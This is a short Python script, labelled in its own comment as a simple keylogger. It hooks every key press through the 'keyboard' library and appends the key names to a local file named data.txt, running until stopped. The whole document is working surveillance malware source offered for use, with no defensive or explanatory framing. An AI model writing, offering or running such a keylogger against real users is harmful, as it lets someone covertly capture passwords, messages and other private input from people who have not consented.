# Description: A simple keylogger that logs all keys pressed by the user
#pip install keyboard
import keyboard

def pressedKeys(key):
    with open('data.txt', 'a') as file:
        if key.name == 'space':
            file.write(' ')
        else:
            file.write(key.name)

keyboard.on_press(pressedKeys)
keyboard.wait()


